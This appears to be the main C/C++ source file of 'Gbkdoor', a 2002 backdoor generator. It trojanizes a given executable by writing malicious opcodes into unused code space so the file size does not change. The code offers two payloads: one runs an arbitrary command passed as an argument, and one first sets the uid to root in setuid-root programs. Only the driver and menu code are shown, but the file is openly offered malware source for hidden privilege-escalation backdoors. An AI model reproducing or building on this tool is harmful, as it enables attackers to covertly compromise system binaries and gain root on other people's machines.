/* backdoor.c   the main  
 *
 * Gildo backdoor generator is copyright (C) 2002 Mauro Meneghin.
 * All rights reserved. The software is redistributable under 
 * the licence given in the file "Licence" distributed in the 
 * Gbkdoor archive.
 */



#include "fileToInfect.h"
#include "pool.h"
#include "opcode.h"
#include "chunk.h"
#include "define.h"

#include <sys/types.h>
#include <stdio.h>

#include <unistd.h>
#include <sys/mman.h>


void usage()
{
  printf("Gbkdoor is a universal backdoor generator\n"
         "it can insert my malicious opcodes inside\n"
         "the program given as argument,\n"
         "WITHOUT INCREASING ITS SIZE!\n"
         "it do so becouse I(Gildo) make it writes\n"
         "into chunks of unused instructions inside\n"
         "the executable.\n"
         "btw, not every program has all the free\n"
         "space that I need, so you have only to try\n"
         "to see if your choosen kind of backdoor fit\n"
         "in it! enjoy\n\n");
  printf("(c)Mauro Meneghin(Gildo)\nmmeneghin@inwind.it\n");
  exit(1);
}

  
int choice()
{
  int c;
  printf("now there are some possible kinds of backdoor you can insert:\n"
         "\t1)list1 is the most little one, who only allow you to execute\n"
         "\t\tthe command given as the %d argument passed to the trojanized program\n"
         "\t2)list2 is a bit bigger, and set uid to root first, so you can execute programs\n"
         "\t\tas if you are root, but the file to trojanize must be suidroot!\n",
         LIST1_BASH_ARGC-1,LIST2_BASH_ARGC-1);
  printf("enter the number of the kind of backdoor that you want to install: ");
  c=getchar()-'0';
  printf("\n");
  return c;
}  


int main(int argc,char **argv)
{
  if(argc!=2) usage();
  FileToInfect f(argv[1]);
  f.Analize();
  f.ChooseBetterInfection(choice());

  
  printf("(c)Mauro Meneghin(Gildo)\nmmeneghin@inwind.it\n");
  return(0);
}

